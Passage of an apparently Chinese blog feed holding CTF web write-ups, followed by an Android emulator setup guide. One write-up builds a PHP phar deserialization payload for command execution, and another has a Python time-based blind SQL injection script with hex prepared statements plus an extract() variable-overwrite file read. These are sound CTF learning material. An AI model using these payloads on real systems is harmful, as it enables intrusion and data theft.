punctuation">&#125;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而这里有个对token的检查，去上面看看<code>$_SESSION[&#39;user&#39;]</code>的信息。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试之后发现这里的<code>`$_SESSION[&#39;user&#39;]</code>似乎是不变的，就是<code>GXYc40f1c10a4567421ab3fcbd6691316dd</code></p><p><img src="/2021/04/04/GXYCTF2019-BabysqliV3-0/image-20210404144203032.png" alt="token"></p><p>随意传一张图片获得token，payload为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Uploader</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"GXYd0621478c780f56843b7d021b93dc3b0"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'highlight_file("/var/www/html/flag.php");'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"7.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"test.txt"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GIF89a"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/04/04/GXYCTF2019-BabysqliV3-0/image-20210404150556379.png" alt="image-20210404150556379"></p><p>然后将name传为phar文件的绝对路径，这么写<code>phar:///var/www/html/uploads/61e3e88a8d251fbbe278248846d9d33b/GXYd0621478c780f56843b7d021b93dc3b0.txt</code>，然后随意上传一个文件即可获得flag.php的文件。</p><p>payload为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;home.php?file&#x3D;upload&amp;name&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;61e3e88a8d251fbbe278248846d9d33b&#x2F;GXYd0621478c780f56843b7d021b93dc3b0.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里利用的是他upload.php文件里面的最后一句这个</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$uploader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uploader</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"下面是你上传的文件：&lt;br>"</span><span class="token punctuation">.</span><span class="token variable">$uploader</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的file_get_contents()方法，首先对象当做字符串使用触发<strong>tostring魔术方法，然后返回filename，而filename已经被我们修改为了phar文件的位置，最后因调用file_get_contents(phar文件)触发phar反序列化修改cmd参数的值，最后又在销毁对象执行`</strong>destruct()`魔术方法时，实现命令执行</p><p><img src="/2021/04/04/GXYCTF2019-BabysqliV3-0/image-20210404155826466.png" alt="getflag"></p><p><img src="/2021/04/04/GXYCTF2019-BabysqliV3-0/20191105195413-fc4b3ca0-ffc2-1.png" alt="触发phar反序列化的函数——seebug"></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><code>flag&#123;9e42dd1a-4e59-4f49-ad15-d85368d558bd&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> phar反序列化 </tag>
            
            <tag> 密码爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf中的php知识点</title>
      <link href="2021/03/26/ctf%E4%B8%AD%E7%9A%84php%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>2021/03/26/ctf%E4%B8%AD%E7%9A%84php%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="反引号可命令执行，并返回执行结果"><a href="#反引号可命令执行，并返回执行结果" class="headerlink" title="反引号可命令执行，并返回执行结果"></a>反引号可命令执行，并返回执行结果</h2><p><img src="/2021/03/26/ctf%E4%B8%AD%E7%9A%84php%E7%9F%A5%E8%AF%86%E7%82%B9/image-20210326210507322.png" alt="php中反引号可做命令执行"></p><h2 id="取反或者异或bypass"><a href="#取反或者异或bypass" class="headerlink" title="取反或者异或bypass"></a>取反或者异或bypass</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>swpu2019-web4</title>
      <link href="2021/03/25/swpu2019-web4/"/>
      <url>2021/03/25/swpu2019-web4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sql注入判定"><a href="#sql注入判定" class="headerlink" title="sql注入判定"></a>sql注入判定</h2><p>给的是个登录界面，并且没有开放注册功能，登录键点了也没反应，抓包</p><p><img src="/2021/03/25/swpu2019-web4/image-20210326002616701.png" alt="登录界面"></p><p><strong>这种登录界面的一般就是sql注入了</strong></p><p><img src="/2021/03/25/swpu2019-web4/image-20210326003204466.png" alt="抓包得到的图如下"></p><p>当username字段的值为<code>1&#39;</code>或<code>1;&#39;</code>时报错了，而当username为<code>1&#39;&#39;</code>或者<code>1&#39;;</code>时，报错又消失了，wp上说这种是PDO模式下的堆叠注入，emmm，堆叠注入也做过一两题。</p><h2 id="php中的PDO"><a href="#php中的PDO" class="headerlink" title="php中的PDO"></a>php中的PDO</h2><p>那什么是PDO呢？</p><p><a href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p><p><a href="https://www.runoob.com/php/php-pdo.html">https://www.runoob.com/php/php-pdo.html</a></p><p>这里默认是pdo对象的query语句是能执行有<code>;</code>参与的多语句执行的，那我们就能闭合前面的单引号后进行堆叠注入。</p><h2 id="sql过滤关键词的绕过——运用sql的预处理语句绕"><a href="#sql过滤关键词的绕过——运用sql的预处理语句绕" class="headerlink" title="sql过滤关键词的绕过——运用sql的预处理语句绕"></a>sql过滤关键词的绕过——运用sql的预处理语句绕</h2><p>emmm，看wp的话应该是过滤了一些关键字的，这里没有任何特殊回显的情况下呢，一般就是盲注，盲注中呢，这种情况用时间盲注的概率又较大。</p><h3 id="时间盲注的大致思路"><a href="#时间盲注的大致思路" class="headerlink" title="时间盲注的大致思路"></a>时间盲注的大致思路</h3><p><code>select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(5),1)</code>，其中呢<code>&#123;0&#125;</code>一般是猜测该字段可能的长度（毕竟要用substr截取），而<code>&#123;1&#125;</code>一般就是32-128的ascii的数值（盲注爆破）。</p><h3 id="sql预处理绕过过滤"><a href="#sql预处理绕过过滤" class="headerlink" title="sql预处理绕过过滤"></a>sql预处理绕过过滤</h3><p>接下来实验如何绕过这些单词的限制，用的是<code>十六进制表示与sql预处理</code>的结合。</p><p>这里看wp测试的大概就是这几步吧</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select hex(&#39;select sleep(5)&#39;);mysql&gt; set @a&#x3D;0x73656C65637420736C656570283529;mysql&gt; prepare test from @a;mysql&gt; execute test;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>select sleep(5);</code>语句可以让mysql服务休息5秒。这里这四句相当于执行了该语句，从而绕过上传被过滤的字符串。</p><p>实验过后确实可以，截图如下</p><p><img src="/2021/03/25/swpu2019-web4/image-20210402005136110.png" alt="mysql预处理与hex绕过过滤"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># author: c1e4r</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> string<span class="token punctuation">.</span>printable    <span class="token comment"># 题目地址</span>    url <span class="token operator">=</span> <span class="token string">'http://0d9cf3a3-f742-48ea-9ba6-e7c35f61652b.node3.buuoj.cn/index.php?r=Login/Login'</span>    <span class="token comment"># 注入payload</span>    payloads <span class="token operator">=</span> <span class="token string">"asd';set @a=0x&#123;0&#125;;prepare exc from @a;execute exc-- "</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 查询payload</span>        payload <span class="token operator">=</span> <span class="token string">"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(1),1)"</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token comment"># 将构造好的payload进行16进制转码和json转码</span>            datas <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> payloads<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str_to_hex<span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'test213'</span><span class="token punctuation">&#125;</span>            data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>            times <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> times <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">:</span>                flag <span class="token operator">=</span> flag <span class="token operator">+</span> j                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获得了一个提示，是个文件备份似乎<code>glzjin_wants_a_girl_friend.zip</code>，下载下来看一看，又转成代码审计了啊这。</p><h2 id="代码审计，变量覆盖"><a href="#代码审计，变量覆盖" class="headerlink" title="代码审计，变量覆盖"></a>代码审计，变量覆盖</h2><p>注意到所有的前端应用到的逻辑的基础都是在controller文件夹下，而其他两个文件又都是基于basecontroller.php文件的，一切从这个文件展开</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">loadView</span><span class="token punctuation">(</span><span class="token variable">$viewName</span> <span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$viewData</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">viewPath</span> <span class="token operator">=</span> <span class="token constant">BASE_PATH</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"/View/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$viewName</span><span class="token punctuation">&#125;</span></span>.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">viewPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$viewData</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">viewPath</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emmm，这里用了<code>extract</code>函数，传入<code>viewdata</code>数组造成变量覆盖，利用<code>loadView</code>方法的并且第二个元素可控的地方只有<code>UserController.php</code>文件这一个地方</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">actionIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$listData</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadView</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'userIndex'</span><span class="token punctuation">,</span><span class="token variable">$listData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>$listData = $_REQUEST;</code>可以控制，故再转到<code>userIndex.php</code>文件看看，</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fakeimg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$img_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$img_file</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/../favicon.ico'</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token variable">$img_dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token variable">$img_file</span><span class="token punctuation">;</span>                <span class="token variable">$img_base64</span> <span class="token operator">=</span> <span class="token function">imgToBase64</span><span class="token punctuation">(</span><span class="token variable">$img_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;img src="'</span> <span class="token punctuation">.</span> <span class="token variable">$img_base64</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'">'</span><span class="token punctuation">;</span>       <span class="token comment">//图片形式展示</span>                <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的<code>$img_file</code>的值可利用前面的逻辑进行覆盖，传入<code>img_file=./../flag.php</code>即可，而又因为下面的路由控制</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 路由控制跳转至控制器</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$controller</span><span class="token punctuation">&#125;</span></span>Controller"</span><span class="token punctuation">;</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"action<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$action</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">method_exists</span><span class="token punctuation">(</span><span class="token variable">$controller</span><span class="token punctuation">,</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"actionIndex"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$controller</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"LoginController"</span><span class="token punctuation">;</span>        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"actionIndex"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token variable">$controller</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location:index.php?r=Login/Index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知我们要传入路由<code>r=User/Index</code></p><p>故payload为</p><p>GET:<code>index.php?r=User/Index</code></p><p>POST:<code>img_file=/../flag.php</code>     //这个怎么传都可以</p><p><img src="/2021/03/25/swpu2019-web4/image-20210404014912530.png" alt="传参payload"></p><p><img src="/2021/03/25/swpu2019-web4/image-20210404015006259.png" alt="base得flag"></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><code>flag&#123;6b969041-0ce3-49f0-ba65-912d77e4a1e4&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何将AndroidStudio连接到雷电模拟器</title>
      <link href="2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
      <url>2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="如何将AndroidStudio连接到雷电模拟器"><a href="#如何将AndroidStudio连接到雷电模拟器" class="headerlink" title="如何将AndroidStudio连接到雷电模拟器"></a>如何将AndroidStudio连接到雷电模拟器</h1><h2 id="1-先下载好雷电模拟器"><a href="#1-先下载好雷电模拟器" class="headerlink" title="1.先下载好雷电模拟器"></a>1.先下载好雷电模拟器</h2><p>直接浏览器搜，然后再在官网下载安装。</p><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/image-20210323234804382.png" alt="image-20210323234804382"></p><h2 id="2-模拟器设置"><a href="#2-模拟器设置" class="headerlink" title="2.模拟器设置"></a>2.模拟器设置</h2><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/image-20210324000947774.png" alt="image-20210324000947774"></p><p>先进开发者模式(点击5次版本号即可)，然后打开usb调试</p><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/image-20210324001100019.png" alt="image-20210324001100019"></p><p><strong>然后进入雷电模拟器的文件打开位置，打开powershell，输入如下图所示的命令</strong></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;adb.exe connect 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/image-20210324001247485.png" alt="image-20210324001247485" style="zoom:150%;"></p><h2 id="3-android-studio设置"><a href="#3-android-studio设置" class="headerlink" title="3.android studio设置"></a>3.android studio设置</h2><p>然后进入android studio软件里面直接run起来创建好的空白项目，直接as就能帮忙连接到雷电模拟器上面运行了，嘿嘿。</p><p>emmm，说下体验吧，比as自带的那些个模拟器个人感觉好多了有木有，自带的我用着真的卡到爆。。。</p><p><img src="/2021/03/23/%E5%A6%82%E4%BD%95%E5%B0%86AndroidStudio%E8%BF%9E%E6%8E%A5%E5%88%B0%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8/image-20210324001721110.png" alt="image-20210324001721110"></p><h2 id="4-需要注意的点"><a href="#4-需要注意的点" class="headerlink" title="4.需要注意的点"></a>4.需要注意的点</h2><ul><li>在命令行里面执行命令之前要打开两个软件</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装openvpn</title>
      <link href="2021/03/18/kali%E5%AE%89%E8%A3%85openvpn/"/>
      <url>2021/03/18/kali%E5%AE%89%E8%A3%85openvpn/</url>
      
